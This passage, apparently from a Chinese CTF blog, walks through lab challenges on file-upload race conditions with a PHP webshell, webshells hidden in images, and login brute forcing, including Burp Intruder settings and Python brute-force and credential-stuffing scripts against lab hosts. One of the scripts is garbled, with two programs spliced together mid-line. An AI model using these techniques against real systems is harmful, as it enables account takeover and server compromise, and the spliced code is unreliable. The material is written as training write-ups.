<p>那么怎么大量上传呢？需要用到BP的爆破技巧</p>
<p>首先先将母马传上去（dama.php），传上去很快就被删除了，此时右键发送到intruder（测试器）</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222056636.png" alt="image-20240822205609521"></p>
<p>选到positions，将BP自动选定的定位符clean，将包原封不动，然后点击payloads</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222057639.png" alt="image-20240822205751558"></p>
<p>有效载荷类型选择没有负载（null），无限期重复，在options中有线程，改不改都行，点击上传，此时BP就会一直上传。</p>
<p>这个时候访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.../upload/dama.php</span><br></pre></td></tr></table></figure>

<p>抓包，发送到intruder，再次进行爆破，此时有两个条件竞争会同时进行，如果成功的话就会生成一个xiao.php</p>
<p>也可以直接写个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">dama_url = &#x27;http://.../upload/dama.php&#x27;</span><br><span class="line">while(True):                                      #while死循环</span><br><span class="line">	r = requests.get(url=dama_url)</span><br></pre></td></tr></table></figure>

<p>这是再访问…&#x2F;upload&#x2F;xiao.php就能成功。</p>
<h3 id="11-二次渲染绕过"><a href="#11-二次渲染绕过" class="headerlink" title="[11-二次渲染绕过]"></a><strong>[11-二次渲染绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222119993.png" alt="img"></p>
<p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢？</p>
<ol>
<li><p>GIF<br>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p>
</li>
<li><p>PNG<br>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块（如果第一次失败了保存图片再渲染一次即可）</p>
</li>
<li><p>JPG<br>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</p>
</li>
</ol>
<p>LOOK一下WP，不在赘述</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>认证爆破</title>
    <url>/2024/082326737.html</url>
    <content><![CDATA[<h1 id="认证爆破"><a href="#认证爆破" class="headerlink" title="认证爆破"></a>认证爆破</h1><h2 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h2><p>身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。<br>身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。<br>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问。</p>
<span id="more"></span>

<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="1-四位数字爆破"><a href="#1-四位数字爆破" class="headerlink" title="[1-四位数字爆破]"></a><strong>[1-四位数字爆破]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241532460.png" alt="image-20240824153241405"></p>
<p>抓包，添加定位符</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241538909.png" alt="image-20240824153812869"></p>
<p>选择数值爆破方式，从0到9999，每次增加1个</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241539216.png" alt="image-20240824153927177"></p>
<p>最小位数为4位，最大位数也是4位，小数位数0</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241541092.png" alt="image-20240824154107051"></p>
<p>之后开始爆破得到密码。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241542949.png" alt="image-20240824154246889"></p>
<h3 id="2-简单弱口令爆破"><a href="#2-简单弱口令爆破" class="headerlink" title="[2-简单弱口令爆破]"></a><strong>[2-简单弱口令爆破]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241543550.png" alt="image-20240824154344512"></p>
<p>同上一题，选取定位符</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241547377.png" alt="image-20240824154759353"></p>
<p>选择简单列表，导入自己的字典</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241553606.png" alt="image-20240824155304559"></p>
<p>拿到密码</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241554120.png" alt="image-20240824155401075"></p>
<h3 id="3-带验证码爆破"><a href="#3-带验证码爆破" class="headerlink" title="[3-带验证码爆破]"></a><strong>[3-带验证码爆破]</strong></h3><p>每刷新一次页面，验证码都会变</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241555745.png" alt="image-20240824155506706"></p>
<p>先随便弄个密码，输上验证码，BP抓包，这个时候不要放包，只要不放包验证码就不会变，之后按照上一题的做法继续做，导入字典即可</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241606708.png" alt="image-20240824160629665"></p>
<h3 id="4-Basic-认证爆破-（Custom-itermtor"><a href="#4-Basic-认证爆破-（Custom-itermtor" class="headerlink" title="**[4-Basic 认证爆破]**（Custom itermtor"></a>**[4-Basic 认证爆破]**（Custom itermtor</h3><p>打开后直接弹小窗</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241607278.png" alt="image-20240824160734242"></p>
<p>tomcat6和低版本的7，老版本的海康威视都可以用这种方法。</p>
<p>根据提示，用户名admin，密码随便输，BP抓包观察一下，有个basic,后边有一串base64</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241612981.png" alt="image-20240824161227936"></p>
<p>放到Decode进行base64解码，看到密码格式</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241613010.png" alt="image-20240824161356966"></p>
<p>之后用迭代器爆破，选上定位符</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241625679.png" alt="image-20240824162554650"></p>
<p>选择迭代器爆破，用2迭代器，导入字典</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241619381.png" alt="image-20240824161938335"></p>
<p>用1迭代器，导入admin，刚才解码看出来admin和密码之间是：分割的，所以输入:分隔 </p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241639848.png" alt="image-20240824163901799"></p>
<p>之后因为密码是base64形式的，选上base64编码，因为base64会编码特殊字符，需要取消最后⾯的payload url⾃动编码。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241620365.png" alt="image-20240824162042330"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241640622.png" alt="image-20240824164045580"></p>
<h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="[5-前端加密爆破]"></a><strong>[5-前端加密爆破]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241641039.png" alt="image-20240824164140995"></p>
<p>可以看到密码自动md5加密了</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241643346.png" alt="image-20240824164322314"></p>
<p>直接用BP自带的密码，然后hash:md5</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241646580.png" alt="image-20240824164609537"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241647109.png" alt="image-20240824164708061"></p>
<h3 id="6-泄露数据撞库"><a href="#6-泄露数据撞库" class="headerlink" title="[6-泄露数据撞库]"></a><strong>[6-泄露数据撞库]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241647295.png" alt="image-20240824164742261"></p>
<p>可以看到数据库的数据虽然是一一对应的，但是系统可能识别不了，需要清洗一下</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241656436.png" alt="image-20240824165626403"></p>
<p>打开vscode，搜索，选上正则匹配，搜索框输入**.<em>+空格<strong>，就能匹配到姓名，shift+ctrl+l保存，（注意姓名后边会有空格，全部替换为空）同理输入</strong>空格+.**</em>,就能匹配到密码。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241752953.png" alt="image-20240824175222912"></p>
<p>BP抓包，这个时候用户名和密码都需要定位符，因为是一一对应的关系</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241759304.png" alt="image-20240824175926274"></p>
<p>攻击类型选择Pitchfork攻击</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241800615.png" alt="image-20240824180038578"></p>
<p>回到payloads，这里payload set有两个，第一个导入姓名，第二个导入密码</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241802671.png" alt="image-20240824180257634"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241803662.png" alt="image-20240824180308628"></p>
<p>之后开始攻击。</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241812311.png" alt="image-20240824181224272"></p>
<p>提取脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = open(&#x27;db.txt&#x27;).read()</span><br><span class="line">res = f.split(&quot;\n&quot;)</span><br><span class="line">with open(&#x27;user.txt&#x27;,&#x27;w&#x27;) as user:</span><br><span class="line">for i in res:</span><br><span class="line">user.write(i.split(&quot; &quot;)[0]+&quot;\n&quot;)</span><br><span class="line">user.close()</span><br><span class="line">with open(&#x27;pass.txt&#x27;,&#x27;w&#x27;) as passowrd:</span><br><span class="line">for i in res:</span><br><span class="line">passowrd.write(i.split(&quot; &quot;)[1]+&quot;\n&quot;)</span><br><span class="line">passowrd.close()</span><br></pre></td></tr></table></figure>

<h3 id="7-返回包特征提取爆破"><a href="#7-返回包特征提取爆破" class="headerlink" title="[7-返回包特征提取爆破]"></a><strong>[7-返回包特征提取爆破]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241817712.png" alt="image-20240824181709671"></p>
<p>这个题登陆成功和登录失败返回的长度都一样，无法通过返回包长度看是否成功爆破</p>
<p>同样抓包，看到密码也是被md5加密了</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241818030.png" alt="image-20240824181835999"></p>
<p>用自带密码，添加md5加密，但是返回的长度都一样</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241821796.png" alt="image-20240824182114756"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241821862.png" alt="image-20240824182128827"></p>
<p>这个时候去options，点击<strong>Grep-Extract</strong></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241823856.png" alt="image-20240824182313807"></p>
<p>这时候看到添加上了，开始爆破</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241824612.png" alt="image-20240824182409573"></p>
<p>GG实战：<a href="https://www.sqlsec.com/2017/11/nnuwifi.html">https://www.sqlsec.com/2017/11/nnuwifi.html</a></p>
<p>可以看到长度一样，但是内容不一样</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408241835781.png" alt="image-20240824183530749"></p>
<h3 id="8-简单的-token-验证"><a href="#8-简单的-token-验证" class="headerlink" title="[8-简单的 token 验证]"></a><strong>[8-简单的 token 验证]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242032615.png" alt="image-20240824203255542"></p>
<p>解密发现token是时间戳</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242033471.png" alt="image-20240824203316442"></p>
<p>Unix 时间戳是从 1970 年 1 ⽉ 1 ⽇（UTC&#x2F;GMT的午夜）开始所经过的秒数 </p>
<p>由于 Burp 不能对时间戳进⾏设置，得⼿动写脚本进⾏爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from hashlib import md5</span><br><span class="line">url = &quot;http:&quot;#127.0.0.1/boom8/&quot;</span><br><span class="line">passwd = open(&quot;boom8/pass.txt&quot;).read().split(&quot;\n&quot;)</span><br><span class="line">for pw in passwd:</span><br><span class="line">times = int(time.time())</span><br><span class="line">token = md5(str(times).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">payload = &#123;</span><br><span class="line">&quot;username&quot; : &quot;admin&quot;,</span><br><span class="line">&quot;password&quot; : pw,</span><br><span class="line">&quot;token&quot; : token</span><br><span class="line"> &#125;</span><br><span class="line">r = requests.post(url=url,dimport time</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">def md5(str):</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str.encode(&quot;utf8&quot;))</span><br><span class="line">return m.hexdigest()</span><br><span class="line">def main():</span><br><span class="line">url = &quot;http:&quot;#10.20.24.244/&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">&#x27;Host&#x27;: &#x27;10.20.24.244&#x27;,</span><br><span class="line">&#x27;Content-Type&#x27;: &#x27;application/x-&quot;&quot;&amp;-form-urlencoded&#x27;,</span><br><span class="line">&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br><span class="line">(KHTML, like Gecko)&#x27;,</span><br><span class="line"> &#125;</span><br><span class="line">payloads = open(&quot;pass.txt&quot;).read().split(&quot;\n&quot;)</span><br><span class="line">for payload in payloads:</span><br><span class="line">data = f&quot;username=admin&amp;password=&#123;payload &#125;&amp;token=&#123;md5(str(int(time.time())))&#125;&quot;</span><br><span class="line">r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">if &#x27;flag&#123;&#x27; in r.text:</span><br><span class="line">print(f&quot;\033[32;1m[+] success &#123;data&#125;\033[0m&quot;)</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">print(f&quot;\033[1;34m[*] attack &#123;data&#125;\033[0m&quot;)</span><br><span class="line">if &quot;&#x27;name&quot;&#x27; &quot;( &quot;&quot;&#x27;main&quot;&#x27;&quot;:</span><br><span class="line">main()</span><br><span class="line">ata=payload)</span><br><span class="line">if &#x27;flag&#123;&#x27; in r.text:</span><br><span class="line">print(r.text)</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">print(&quot;[+] attack &#123;&#125;&quot;.format(pw))</span><br><span class="line">time.sleep(1)</span><br></pre></td></tr></table></figure>

<h3 id="9-泄露数据撞库-2"><a href="#9-泄露数据撞库-2" class="headerlink" title="[9-泄露数据撞库 2]"></a><strong>[9-泄露数据撞库 2]</strong></h3><p>上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">def md5(str):</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str.encode(&quot;utf8&quot;))</span><br><span class="line">return m.hexdigest()</span><br><span class="line">r = requests.get(&quot;http:&quot;#&quot;&quot;&amp;.ggctf.com:30066/db.txt&quot;)</span><br><span class="line">lines = r.text.split(&quot;\n&quot;)</span><br><span class="line">for line in lines:</span><br><span class="line">username_password = line.split(&quot; &quot;)</span><br><span class="line">data = &#123;</span><br><span class="line">&quot;username&quot;: username_password[0],</span><br><span class="line">&quot;password&quot;: md5(username_password[1]),</span><br><span class="line"> &#125;</span><br><span class="line">r = requests.post(url=&quot;http:&quot;#&quot;&quot;&amp;.ggctf.com:30066&quot;, data=data)</span><br><span class="line">if &#x27;flag&#123;&#x27; in r.text:</span><br><span class="line">print(&#x27;\033[32;1m[+]\033[0m &#x27; + username_password[0] + &quot;:&quot; +</span><br><span class="line">username_password[1])</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">print(&#x27;\033[1;34m[*]\033[0m &#x27; + username_password[0] + &quot;:&quot; +</span><br><span class="line">username_password[1])</span><br></pre></td></tr></table></figure>

<p>BP也可以做，做法一样</p>
<h3 id="10-带验证码爆破"><a href="#10-带验证码爆破" class="headerlink" title="[10-带验证码爆破]"></a><strong>[10-带验证码爆破]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242037602.png" alt="image-20240824203738552"></p>
<p>这个验证码不跟上边那个一样了，这次是真的验证码。</p>
<p>所以这次爆破后即使不放包也会显示验证码有误</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242042148.png" alt="image-20240824204221093"></p>
<p>第一种方法：</p>
<p>用一个小工具，pkavhttpfuzzer.</p>
<p>首先，把BP的字典导出来，把请求包复制粘贴到工具中，点击添加标记，标记密码，选中验证码，添加验证码标记，这是两种标记</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242059768.png" alt="image-20240824205946716"></p>
<p>点击验证码识别，有个验证码地址，右击网站中验证码，在新标签页 中打开，复制网址填写。 </p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242100484.png" alt="image-20240824210021440"></p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242102624.png" alt="image-20240824210254577"></p>
<p>点击下放重放选项，选择单线程模式</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242103704.png" alt="image-20240824210349651"></p>
<p>回到变体设置，导入刚才复制出来的BP字典</p>
<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408242105004.png" alt="image-20240824210527958"></p>
<p>发包器即可。</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
